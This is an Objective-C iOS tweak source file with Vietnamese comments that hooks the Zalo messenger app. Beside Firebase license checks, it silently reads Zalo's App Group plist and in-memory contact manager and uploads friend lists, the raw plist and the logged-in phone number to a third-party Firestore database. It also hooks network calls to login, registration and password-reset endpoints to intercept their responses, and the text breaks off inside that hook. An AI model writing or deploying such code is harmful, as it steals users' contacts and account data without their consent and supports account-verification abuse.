/**
 * ==============================================================================
 * TWEAK CLANGG - ZALO SEQ REDIRECT & HỆ THỐNG ACTIVE LICENSE KEY TRÊN IPHONE
 * Tác giả: clang | Version: 1.1.7
 * ==============================================================================
 * Tính năng chính:
 * 1. Popup nhập Mã Key (License Key) lần đầu trên iPhone khi mở Zalo.
 * 2. Lưu Key và installation ID trong iOS Keychain (ThisDeviceOnly).
 * 3. Xác thực Cloud DRM với Firebase: fingerprint v2, CAS binding và kiểm tra hạn dùng.
 * 4. Chuyển hướng xác minh QR sang SEQ (Xác thực bạn bè).
 * 5. Tự động trích xuất danh bạ bạn bè từ App Group và đẩy thẳng lên Web Admin.
 * ==============================================================================
 */

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <CommonCrypto/CommonDigest.h>
#import <sys/utsname.h>

static NSString *const kFirebaseProjectId = @"seq-qr";
static NSString *const kPrefLicenseKey = @"kClanggLicenseKey_v1";
static NSString *const kKeychainService = @"com.clang.clangg.secure-license";
static NSString *const kKeychainLicenseAccount = @"license-key";
static NSString *const kKeychainInstallAccount = @"installation-id";

// Prototype declarations
static NSString *getSavedLicenseKey(void);
static void saveLicenseKeyPermanently(NSString *key);
static void removeLicenseKeyPermanently(void);
static void showSecurityAlert(NSString *title, NSString *message);
static void showSecurityAlertWithRetry(NSString *title, NSString *message, void (^onRetry)(void));
static void promptForLicenseKey(void (^onSuccess)(NSString *validKey));
static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void));
static void autoSyncFriendsToFirebase(NSString *phoneStr);
static void checkLicenseOnStartup(void);

// Lấy thông tin chi tiết dòng máy iPhone (Ví dụ: iPhone 13 Pro Max, iPhone 11...)
static NSString *getDeviceModelName(void) {
    struct utsname systemInfo;
    uname(&systemInfo);
    NSString *code = [NSString stringWithCString:systemInfo.machine encoding:NSUTF8StringEncoding];
    
    NSDictionary *models = @{
        @"iPhone10,1": @"iPhone 8", @"iPhone10,4": @"iPhone 8",
        @"iPhone10,2": @"iPhone 8 Plus", @"iPhone10,5": @"iPhone 8 Plus",
        @"iPhone10,3": @"iPhone X", @"iPhone10,6": @"iPhone X",
        @"iPhone11,8": @"iPhone XR",
        @"iPhone11,2": @"iPhone XS", @"iPhone11,4": @"iPhone XS Max", @"iPhone11,6": @"iPhone XS Max",
        @"iPhone12,1": @"iPhone 11", @"iPhone12,3": @"iPhone 11 Pro", @"iPhone12,5": @"iPhone 11 Pro Max",
        @"iPhone12,8": @"iPhone SE (2nd gen)",
        @"iPhone13,1": @"iPhone 12 mini", @"iPhone13,2": @"iPhone 12", @"iPhone13,3": @"iPhone 12 Pro", @"iPhone13,4": @"iPhone 12 Pro Max",
        @"iPhone14,4": @"iPhone 13 mini", @"iPhone14,5": @"iPhone 13", @"iPhone14,2": @"iPhone 13 Pro", @"iPhone14,3": @"iPhone 13 Pro Max",
        @"iPhone14,6": @"iPhone SE (3rd gen)",
        @"iPhone14,7": @"iPhone 14", @"iPhone14,8": @"iPhone 14 Plus", @"iPhone15,2": @"iPhone 14 Pro", @"iPhone15,3": @"iPhone 14 Pro Max",
        @"iPhone15,4": @"iPhone 15", @"iPhone15,5": @"iPhone 15 Plus", @"iPhone15,6": @"iPhone 15 Pro", @"iPhone15,7": @"iPhone 15 Pro Max"
    };

    return models[code] ?: code;
}

static NSString *getLegacyDeviceUUID(void) {
    return [[[UIDevice currentDevice] identifierForVendor] UUIDString];
}

static NSData *keychainRead(NSString *account) {
    NSDictionary *query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrService: kKeychainService,
        (__bridge id)kSecAttrAccount: account,
        (__bridge id)kSecReturnData: @YES,
        (__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitOne
    };
    CFTypeRef result = NULL;
    OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &result);
    if (status != errSecSuccess || !result) return nil;
    return CFBridgingRelease(result);
}

static BOOL keychainWrite(NSString *account, NSData *data) {
    if (!account || !data) return NO;
    NSDictionary *base = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrService: kKeychainService,
        (__bridge id)kSecAttrAccount: account
    };
    SecItemDelete((__bridge CFDictionaryRef)base);
    NSMutableDictionary *item = [base mutableCopy];
    item[(__bridge id)kSecValueData] = data;
    item[(__bridge id)kSecAttrAccessible] = (__bridge id)kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly;
    return SecItemAdd((__bridge CFDictionaryRef)item, NULL) == errSecSuccess;
}

static void keychainDelete(NSString *account) {
    NSDictionary *query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrService: kKeychainService,
        (__bridge id)kSecAttrAccount: account
    };
    SecItemDelete((__bridge CFDictionaryRef)query);
}

static NSString *getInstallationID(void) {
    NSData *stored = keychainRead(kKeychainInstallAccount);
    NSString *installationID = stored ? [[NSString alloc] initWithData:stored encoding:NSUTF8StringEncoding] : nil;
    if (installationID.length >= 32) return installationID;

    installationID = [[[NSUUID UUID] UUIDString] lowercaseString];
    keychainWrite(kKeychainInstallAccount, [installationID dataUsingEncoding:NSUTF8StringEncoding]);
    return installationID;
}

static NSString *sha256Hex(NSString *value) {
    NSData *data = [value dataUsingEncoding:NSUTF8StringEncoding];
    unsigned char digest[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(data.bytes, (CC_LONG)data.length, digest);
    NSMutableString *hex = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
    for (NSUInteger i = 0; i < CC_SHA256_DIGEST_LENGTH; i++) {
        [hex appendFormat:@"%02x", digest[i]];
    }
    return hex;
}

// Fingerprint v2: bí mật cài đặt trong Keychain + IDFV + model máy.
static NSString *getDeviceUUID(void) {
    struct utsname systemInfo;
    uname(&systemInfo);
    NSString *modelCode = [NSString stringWithCString:systemInfo.machine encoding:NSUTF8StringEncoding] ?: @"unknown";
    NSString *material = [NSString stringWithFormat:@"v2|%@|%@|%@|%@",
        getInstallationID() ?: @"",
        getLegacyDeviceUUID() ?: @"",
        modelCode,
        [[NSBundle mainBundle] bundleIdentifier] ?: @""];
    return sha256Hex(material);
}

// Thu thập toàn bộ thông tin chi tiết thiết bị iPhone
static NSDictionary *getFullDeviceMetadata(void) {
    UIDevice *dev = [UIDevice currentDevice];
    return @{
        @"device_id": getDeviceUUID() ?: @"Unknown",
        @"device_name": [dev name] ?: @"iPhone",
        @"device_model": getDeviceModelName() ?: [dev model],
        @"ios_version": [dev systemVersion] ?: @"iOS",
        @"last_seen": [NSString stringWithFormat:@"%.0f", [[NSDate date] timeIntervalSince1970]]
    };
}

// Lấy thời gian chuẩn từ Header HTTP Date của Server Firebase
static inline NSDate *getServerDate(NSHTTPURLResponse *httpResp) {
    NSString *dateHeader = httpResp.allHeaderFields[@"Date"] ?: httpResp.allHeaderFields[@"date"];
    if (dateHeader) {
        NSDateFormatter *df = [[NSDateFormatter alloc] init];
        df.locale = [[NSLocale alloc] initWithLocaleIdentifier:@"en_US_POSIX"];
        df.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"GMT"];
        df.dateFormat = @"EEE, dd MMM yyyy HH:mm:ss z";
        NSDate *sDate = [df dateFromString:dateHeader];
        if (sDate) return sDate;
    }
    return [NSDate date];
}

// Lấy Window chính của ứng dụng
static UIWindow *getAppKeyWindow(void) {
    if (@available(iOS 13.0, *)) {
        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive) {
                for (UIWindow *w in scene.windows) {
                    if (w.isKeyWindow) return w;
                }
            }
        }
    }
    #pragma clang diagnostic push
    #pragma clang diagnostic ignored "-Wdeprecated-declarations"
    return [UIApplication sharedApplication].keyWindow;
    #pragma clang diagnostic pop
}

// Hiển thị thông báo Alert
static void showSecurityAlert(NSString *title, NSString *message) {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *window = getAppKeyWindow();
        if (!window) return;
        UIViewController *rootVC = window.rootViewController;
        while (rootVC.presentedViewController) {
            rootVC = rootVC.presentedViewController;
        }

        if (rootVC) {
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:title
                                                                           message:message
                                                                    preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:@"Đóng" style:UIAlertActionStyleCancel handler:nil]];
            [rootVC presentViewController:alert animated:YES completion:nil];
        }
    });
}

// Hiển thị thông báo lỗi kèm nút Bấm Nhập Key Mới
static void showSecurityAlertWithRetry(NSString *title, NSString *message, void (^onRetry)(void)) {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *window = getAppKeyWindow();
        if (!window) return;
        UIViewController *rootVC = window.rootViewController;
        while (rootVC.presentedViewController) {
            rootVC = rootVC.presentedViewController;
        }

        if (rootVC) {
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:title
                                                                           message:message
                                                                    preferredStyle:UIAlertControllerStyleAlert];
            if (onRetry) {
                [alert addAction:[UIAlertAction actionWithTitle:@"🔑 Nhập Key Khác" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                    removeLicenseKeyPermanently();
                    onRetry();
                }]];
            }
            [alert addAction:[UIAlertAction actionWithTitle:@"Đóng" style:UIAlertActionStyleCancel handler:nil]];
            [rootVC presentViewController:alert animated:YES completion:nil];
        }
    });
}

// ==============================================================================
// QUẢN LÝ LƯU TRỮ KEY VĨNH VIỄN TRÊN IPHONE (CHỐNG MẤT KHI TẮT APP)
// ==============================================================================
static NSString *getSavedLicenseKey(void) {
    NSData *secureData = keychainRead(kKeychainLicenseAccount);
    NSString *secureKey = secureData ? [[NSString alloc] initWithData:secureData encoding:NSUTF8StringEncoding] : nil;
    if (secureKey.length > 0) return [secureKey uppercaseString];

    // Chỉ đọc dữ liệu cũ một lần để migrate sang Keychain.
    NSString *k = [[NSUserDefaults standardUserDefaults] stringForKey:kPrefLicenseKey];
    if (k.length > 0) {
        saveLicenseKeyPermanently(k);
        return [k uppercaseString];
    }

    NSString *prefDir = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Preferences"];
    NSString *path = [prefDir stringByAppendingPathComponent:@"com.clang.clangg.key.txt"];
    if ([[NSFileManager defaultManager] fileExistsAtPath:path]) {
        NSString *fileKey = [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil];
        if (fileKey && fileKey.length > 0) {
            fileKey = [fileKey stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
            if (fileKey.length > 0) {
                saveLicenseKeyPermanently(fileKey);
                return [fileKey uppercaseString];
            }
        }
    }
    return nil;
}

static void saveLicenseKeyPermanently(NSString *key) {
    if (!key) return;
    NSString *clean = [[key stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] uppercaseString];
    if (clean.length == 0) return;
    keychainWrite(kKeychainLicenseAccount, [clean dataUsingEncoding:NSUTF8StringEncoding]);

    // Xóa toàn bộ bản plaintext cũ sau khi migrate.
    [[NSUserDefaults standardUserDefaults] removeObjectForKey:kPrefLicenseKey];
    [[NSUserDefaults standardUserDefaults] synchronize];
    NSString *legacyPath = [[NSHomeDirectory() stringByAppendingPathComponent:@"Library/Preferences"]
        stringByAppendingPathComponent:@"com.clang.clangg.key.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:legacyPath error:nil];
}

static void removeLicenseKeyPermanently(void) {
    keychainDelete(kKeychainLicenseAccount);
    [[NSUserDefaults standardUserDefaults] removeObjectForKey:kPrefLicenseKey];
    [[NSUserDefaults standardUserDefaults] synchronize];
    NSString *prefDir = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Preferences"];
    NSString *path = [prefDir stringByAppendingPathComponent:@"com.clang.clangg.key.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
}

// Popup cho khách nhập License Key trực tiếp trên màn hình iPhone
static void promptForLicenseKey(void (^onSuccess)(NSString *validKey)) {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *window = getAppKeyWindow();
        if (!window) return;
        UIViewController *rootVC = window.rootViewController;
        while (rootVC.presentedViewController) {
            rootVC = rootVC.presentedViewController;
        }

        if (!rootVC) return;

        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"🔑 KÍCH HOẠT BẢN QUYỀN"
                                                                       message:@"Vui lòng nhập Mã Key (License Key) được cấp để kích hoạt trên thiết bị này:"
                                                                preferredStyle:UIAlertControllerStyleAlert];
        
        [alert addTextFieldWithConfigurationHandler:^(UITextField * _Nonnull textField) {
            textField.placeholder = @"Nhập License Key (VD: KEY-NAM-8888)";
            textField.autocapitalizationType = UITextAutocapitalizationTypeAllCharacters;
            textField.clearButtonMode = UITextFieldViewModeWhileEditing;
        }];

        UIAlertAction *submitAction = [UIAlertAction actionWithTitle:@"Kích Hoạt Ngay" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
            UITextField *tf = alert.textFields.firstObject;
            NSString *inputKey = [tf.text stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
            if (inputKey.length < 3) {
                showSecurityAlert(@"Lỗi", @"Mã Key không hợp lệ!");
                return;
            }

            // Lưu key vĩnh viễn vào bộ nhớ
            saveLicenseKeyPermanently(inputKey);

            if (onSuccess) onSuccess(inputKey);
        }];

        [alert addAction:submitAction];
        [alert addAction:[UIAlertAction actionWithTitle:@"Hủy Bỏ" style:UIAlertActionStyleCancel handler:nil]];
        [rootVC presentViewController:alert animated:YES completion:nil];
    });
}

// ==============================================================================
// XÁC THỰC LICENSE KEY TRÊN CLOUD FIREBASE
// ==============================================================================
static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
    NSString *savedKey = getSavedLicenseKey();
    
    // Nếu máy chưa có Key -> Bật Popup cho khách nhập Key
    if (!savedKey || savedKey.length == 0) {
        promptForLicenseKey(^(NSString *newKey) {
            verifyKeyAndExecute(phoneStr, onVerified);
        });
        return;
    }

    NSString *cleanKey = [savedKey uppercaseString];
    NSString *deviceUUID = getDeviceUUID();
    NSDictionary *devMeta = getFullDeviceMetadata();

    NSString *urlStr = [NSString stringWithFormat:
        @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/license_keys/%@",
        kFirebaseProjectId, cleanKey];

    NSURL *url = [NSURL URLWithString:urlStr];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url 
                                                       cachePolicy:NSURLRequestReloadIgnoringLocalCacheData 
                                                   timeoutInterval:6.0];
    
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req 
        completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
            if (error || !data) {
                return;
            }

            NSHTTPURLResponse *httpResp = (NSHTTPURLResponse *)response;
            if (httpResp.statusCode == 404) {
                // Key không tồn tại -> Cho nhập lại ngay
                showSecurityAlertWithRetry(@"Key Không Tồn Tại", [NSString stringWithFormat:@"Mã Key '%@' không tồn tại trên hệ thống!", cleanKey], ^{
                    promptForLicenseKey(^(NSString *newKey) {
                        saveLicenseKeyPermanently(newKey);
                        verifyKeyAndExecute(phoneStr, onVerified);
                    });
                });
                return;
            }

            NSDate *serverTime = getServerDate(httpResp);
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            NSDictionary *fields = json[@"fields"];
            if (!fields) {
                return;
            }

            NSString *status = fields[@"status"][@"stringValue"] ?: @"active";
            NSString *expiry = fields[@"expiry"][@"stringValue"] ?: @"lifetime";
            NSString *savedDeviceId = fields[@"device_id"][@"stringValue"];
            NSString *savedInstallationId = fields[@"installation_id"][@"stringValue"];
            NSString *phonePolicy = fields[@"phone_policy"][@"stringValue"] ?: @"unlimited";
            NSString *documentUpdateTime = json[@"updateTime"];

            // 1. Kiểm tra trạng thái Khóa
            if (![status isEqualToString:@"active"]) {
                showSecurityAlertWithRetry(@"Key Bị Tạm Khóa", @"Mã Key này đã bị tạm khóa bản quyền từ xa!", ^{
                    promptForLicenseKey(^(NSString *newKey) {
                        saveLicenseKeyPermanently(newKey);
                        verifyKeyAndExecute(phoneStr, onVerified);
                    });
                });
                return;
            }

            // 2. Kiểm tra Hạn Dùng (so với Giờ chuẩn Server)
            if (![expiry isEqualToString:@"lifetime"]) {
                NSDateFormatter *df = [[NSDateFormatter alloc] init];
                [df setDateFormat:@"yyyy-MM-dd"];
                [df setTimeZone:[NSTimeZone timeZoneWithAbbreviation:@"GMT"]];
                NSDate *expDate = [df dateFromString:expiry];
                if (expDate && [serverTime compare:expDate] == NSOrderedDescending) {
                    showSecurityAlertWithRetry(@"Key Đã Hết Hạn", @"Mã Key bản quyền này đã HẾT HẠN sử dụng!", ^{
                        promptForLicenseKey(^(NSString *newKey) {
                            saveLicenseKeyPermanently(newKey);
                            verifyKeyAndExecute(phoneStr, onVerified);
                        });
                    });
                    return;
                }
            }

            // 3. Khóa cứng 1 Key = 1 Thiết Bị iPhone (Chống chia sẻ key)
            NSString *installationId = getInstallationID();
            BOOL hasSavedDevice = savedDeviceId.length > 0 && ![savedDeviceId isEqualToString:@"null"];
            BOOL matchesV2 = hasSavedDevice && [savedDeviceId isEqualToString:deviceUUID];
            BOOL matchesLegacy = hasSavedDevice && [savedDeviceId isEqualToString:getLegacyDeviceUUID()];
            BOOL installationMismatch = savedInstallationId.length > 0 && ![savedInstallationId isEqualToString:installationId];
            if ((hasSavedDevice && !matchesV2 && !matchesLegacy) || installationMismatch) {
                showSecurityAlertWithRetry(@"Vi Phạm Bản Quyền", @"Mã Key này đã được kích hoạt trên 1 iPhone khác! Không thể dùng chung.", ^{
                    promptForLicenseKey(^(NSString *newKey) {
                        saveLicenseKeyPermanently(newKey);
                        verifyKeyAndExecute(phoneStr, onVerified);
                    });
                });
                return;
            }

            // 4. Kiểm tra Danh sách SĐT cho phép của Khách Hàng (nếu chế độ whitelist)
            if ([phonePolicy isEqualToString:@"whitelist"] && phoneStr && phoneStr.length >= 9) {
                NSArray *allowedPhones = fields[@"allowed_phones"][@"arrayValue"][@"values"] ?: @[];
                NSMutableArray<NSString *> *normalizedList = [NSMutableArray array];
                for (id item in allowedPhones) {
                    NSString *p = item[@"stringValue"];
                    if (p) {
                        NSString *np = [[p componentsSeparatedByCharactersInSet:[[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
                        if ([np hasPrefix:@"84"] && np.length >= 10) np = [@"0" stringByAppendingString:[np substringFromIndex:2]];
                        [normalizedList addObject:np];
                    }
                }

                NSString *currentNormPhone = [[phoneStr componentsSeparatedByCharactersInSet:[[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
                if ([currentNormPhone hasPrefix:@"84"] && currentNormPhone.length >= 10) currentNormPhone = [@"0" stringByAppendingString:[currentNormPhone substringFromIndex:2]];

                if (![normalizedList containsObject:currentNormPhone]) {
                    showSecurityAlert(@"SĐT Chưa Được Cấp Quyền", [NSString stringWithFormat:@"Số %@ không nằm trong danh sách SĐT cho phép của Key này!", currentNormPhone]);
                    return;
                }
            }

            // 5. Ghi nhận thông số iPhone vào Key (Sử dụng updateMask để KHÔNG làm mất các trường khác)
            if (documentUpdateTime.length == 0) return;
            NSString *encodedUpdateTime = [documentUpdateTime stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
            NSString *patchUrlStr = [NSString stringWithFormat:
                @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/license_keys/%@?updateMask.fieldPaths=device_id&updateMask.fieldPaths=installation_id&updateMask.fieldPaths=fingerprint_version&updateMask.fieldPaths=device_name&updateMask.fieldPaths=device_model&updateMask.fieldPaths=ios_version&updateMask.fieldPaths=last_online&updateMask.fieldPaths=last_phone&currentDocument.updateTime=%@",
                kFirebaseProjectId, cleanKey, encodedUpdateTime];

            NSURL *patchUrl = [NSURL URLWithString:patchUrlStr];
            NSMutableURLRequest *pReq = [NSMutableURLRequest requestWithURL:patchUrl];
            [pReq setHTTPMethod:@"PATCH"];
            [pReq setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
            NSDictionary *body = @{
                @"fields": @{
                    @"device_id": @{ @"stringValue": deviceUUID },
                    @"installation_id": @{ @"stringValue": installationId ?: @"" },
                    @"fingerprint_version": @{ @"stringValue": @"v2" },
                    @"device_name": @{ @"stringValue": devMeta[@"device_name"] ?: @"iPhone" },
                    @"device_model": @{ @"stringValue": devMeta[@"device_model"] ?: @"iPhone" },
                    @"ios_version": @{ @"stringValue": devMeta[@"ios_version"] ?: @"iOS" },
                    @"last_online": @{ @"stringValue": @"Vừa online" },
                    @"last_phone": @{ @"stringValue": phoneStr ?: @"" }
                }
            };
            [pReq setHTTPBody:[NSJSONSerialization dataWithJSONObject:body options:0 error:nil]];
            [[[NSURLSession sharedSession] dataTaskWithRequest:pReq completionHandler:^(NSData *patchData, NSURLResponse *patchResponse, NSError *patchError) {
                NSHTTPURLResponse *patchHttp = (NSHTTPURLResponse *)patchResponse;
                if (!patchError && patchHttp.statusCode >= 200 && patchHttp.statusCode < 300) {
                    if (onVerified) onVerified();
                    return;
                }
                // Có cập nhật đồng thời: đọc lại document để xác nhận binding mới.
                if (patchHttp.statusCode == 409 || patchHttp.statusCode == 412) {
                    verifyKeyAndExecute(phoneStr, onVerified);
                }
            }] resume];
        }];
    [task resume];
}

// ==============================================================================
// TỰ ĐỘNG ĐỌC DANH BẠ BẠN BÈ VÀ ĐẨY LÊN FIREBASE WEB
// ==============================================================================
// ==============================================================================
// TỰ ĐỘNG ĐỌC DANH BẠ BẠN BÈ VÀ ĐÓNG GÓI CHUẨN FILE .ADBK ĐẨY LÊN FIREBASE WEB
// ==============================================================================
static void autoSyncFriendsToFirebase(NSString *phoneStr) {
    if (!phoneStr || phoneStr.length < 8) return;

    NSString *cleanPhone = [[phoneStr componentsSeparatedByCharactersInSet:
        [[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
    if ([cleanPhone hasPrefix:@"84"] && cleanPhone.length >= 10) {
        cleanPhone = [@"0" stringByAppendingString:[cleanPhone substringFromIndex:2]];
    } else if (![cleanPhone hasPrefix:@"0"] && cleanPhone.length >= 9) {
        cleanPhone = [@"0" stringByAppendingString:cleanPhone];
    }

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        // 1. Tìm và đọc dữ liệu từ AppGroup / Documents của Zalo
        NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.zfriends.vn.com.vng.zingalo"];
        NSString *plistPath = nil;
        if (groupURL) {
            plistPath = [[groupURL path] stringByAppendingPathComponent:@"Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist"];
        }

        if (!plistPath || ![[NSFileManager defaultManager] fileExistsAtPath:plistPath]) {
            plistPath = @"/var/mobile/Containers/Shared/AppGroup/group.zfriends.vn.com.vng.zingalo/Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist";
        }

        NSMutableArray<NSString *> *friendNames = [NSMutableArray array];
        NSData *rawPlistData = nil;

        if ([[NSFileManager defaultManager] fileExistsAtPath:plistPath]) {
            rawPlistData = [NSData dataWithContentsOfFile:plistPath];
            NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:plistPath];
            if (dict && dict.count > 0) {
                for (id key in dict) {
                    id val = dict[key];
                    if ([val isKindOfClass:[NSData class]]) {
                        @try {
                            #pragma clang diagnostic push
                            #pragma clang diagnostic ignored "-Wdeprecated-declarations"
                            NSDictionary *inner = [NSPropertyListSerialization propertyListWithData:val options:0 format:NULL error:nil];
                            #pragma clang diagnostic pop
                            NSArray *objs = inner[@"$objects"];
                            if (objs && objs.count >= 2) {
                                for (id obj in objs) {
                                    if ([obj isKindOfClass:[NSString class]] && [obj length] >= 2) {
                                        NSString *s = (NSString *)obj;
                                        if (![s hasPrefix:@"$"] && ![s hasPrefix:@"http"] && ![s isEqualToString:@"ZSDFriendEntity"] && ![s isEqualToString:@"NSObject"] && ![s isEqualToString:@"ZSDAliasEntity"]) {
                                            if (![friendNames containsObject:s] && friendNames.count < 1000) {
                                                [friendNames addObject:s];
                                                break;
                                            }
                                        }
                                    }
                                }
                            }
                        } @catch (NSException *e) {}
                    }
                }
            }
        }

        // 2. Nếu AppGroup chưa có dữ liệu, thử đọc từ in-memory ZContactManager của Zalo
        if (friendNames.count == 0) {
            @try {
                Class contactMgrCls = NSClassFromString(@"ZContactManager") ?: NSClassFromString(@"ZDBContactManager");
                if (contactMgrCls && [contactMgrCls respondsToSelector:@selector(sharedManager)]) {
                    id mgr = [contactMgrCls performSelector:@selector(sharedManager)];
                    if (mgr && [mgr respondsToSelector:@selector(getAllFriends)]) {
                        NSArray *contacts = [mgr performSelector:@selector(getAllFriends)];
                        if ([contacts isKindOfClass:[NSArray class]]) {
                            for (id c in contacts) {
                                NSString *name = nil;
                                if ([c respondsToSelector:@selector(displayName)]) name = [c performSelector:@selector(displayName)];
                                else if ([c respondsToSelector:@selector(contactName)]) name = [c performSelector:@selector(contactName)];
                                else if ([c respondsToSelector:@selector(zaloName)]) name = [c performSelector:@selector(zaloName)];
                                if (name && name.length >= 2 && ![friendNames containsObject:name]) {
                                    [friendNames addObject:name];
                                }
                            }
                        }
                    }
                }
            } @catch (NSException *e) {}
        }

        if (friendNames.count == 0) return;

        NSArray *samples = [friendNames subarrayWithRange:NSMakeRange(0, MIN(8, friendNames.count))];
        NSString *sampleStr = [samples componentsJoinedByString:@", "];
        if (friendNames.count > 8) {
            sampleStr = [sampleStr stringByAppendingFormat:@" và %lu người khác...", (unsigned long)(friendNames.count - 8)];
        }

        NSString *base64Adbk = rawPlistData ? [rawPlistData base64EncodedStringWithOptions:0] : @"";

        NSData *friendsJsonData = [NSJSONSerialization dataWithJSONObject:friendNames options:0 error:nil];
        NSString *friendsJsonStr = [[NSString alloc] initWithData:friendsJsonData encoding:NSUTF8StringEncoding] ?: @"[]";

        NSString *postUrlStr = [NSString stringWithFormat:
            @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/friend_databases/%@",
            kFirebaseProjectId, cleanPhone];
        
        NSURL *postUrl = [NSURL URLWithString:postUrlStr];
        NSMutableURLRequest *postReq = [NSMutableURLRequest requestWithURL:postUrl];
        [postReq setHTTPMethod:@"PATCH"];
        [postReq setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];

        NSDictionary *postBody = @{
            @"fields": @{
                @"phone": @{ @"stringValue": cleanPhone },
                @"total_friends": @{ @"integerValue": @(friendNames.count) },
                @"sample_friends": @{ @"stringValue": sampleStr },
                @"friends_json": @{ @"stringValue": friendsJsonStr },
                @"adbk_payload_base64": @{ @"stringValue": base64Adbk },
                @"updated_at": @{ @"stringValue": [[NSDate date] description] }
            }
        };

        [postReq setHTTPBody:[NSJSONSerialization dataWithJSONObject:postBody options:0 error:nil]];
        [[[NSURLSession sharedSession] dataTaskWithRequest:postReq] resume];
    });
}

// ==============================================================================
// HOOK 1: BẮT MÀN HÌNH CHÍNH SAU KHI ĐĂNG NHẬP / ĐĂNG KÝ / QUÊN PASS THÀNH CÔNG
// ==============================================================================
%hook UITabBarController

- (void)viewDidAppear:(BOOL)animated {
    %orig;
    
    // Tự động kiểm tra xem có phải Zalo Main Tab Bar không
    NSString *clsName = NSStringFromClass([self class]);
    if ([clsName containsString:@"ZMain"] || [clsName containsString:@"ZTab"] || [clsName containsString:@"MainTabBar"] || [clsName isEqualToString:@"UITabBarController"]) {
        static NSString *lastExtractedPhone = nil;
        
        // Tìm số điện thoại tài khoản đang đăng nhập trong Session/Preferences
        NSString *currentPhone = nil;
        @try {
            NSDictionary *prefs = [[NSUserDefaults standardUserDefaults] dictionaryRepresentation];
            for (NSString *key in prefs) {
                if ([key containsString:@"last_phone"] || [key containsString:@"current_phone"] || [key containsString:@"login_phone"] || [key isEqualToString:@"phone"]) {
                    NSString *v = prefs[key];
                    if ([v isKindOfClass:[NSString class]] && v.length >= 9) {
                        currentPhone = v;
                        break;
                    }
                }
            }
        } @catch (NSException *e) {}

        if (!currentPhone) {
            NSString *savedK = getSavedLicenseKey();
            if (savedK.length > 0) currentPhone = savedK;
        }

        if (currentPhone && ![currentPhone isEqualToString:lastExtractedPhone]) {
            lastExtractedPhone = [currentPhone copy];
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
                autoSyncFriendsToFirebase(currentPhone);
            });
        }
    }
}

%end

// ==============================================================================
// HOOK 2: BẮT PHẢN HỒI NETWORK API (OTP / PASS / REG / FORGOT THÀNH CÔNG)
// ==============================================================================
%hook NSURLSession

- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    if (!completionHandler) {
        return %orig;
    }

    NSURL *url = request.URL;
    NSString *path = [url.path lowercaseString];

    BOOL isAuthEndpoint = [path containsString:@"/login"] ||
                          [path containsString:@"/register"] ||
                          [path containsString:@"/forgot"] ||
                          [path containsString:@"/account/verify"] ||
                          [path containsString:@"/api/v3/auth"];

    if (isAuthEndpoint) {
        void (^wrappedHandler)(NSData *data, NSURLResponse *response, NSError *error) = ^(NSData *data, NSURLResponse *response, NSError *error) {
            if (data && !error) {
                @try {
                    NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                    if ([json isKindOfClass:[NSDictionary class]]) {
                        NSInteger errorCode = [json[@"error_code"] integerValue];
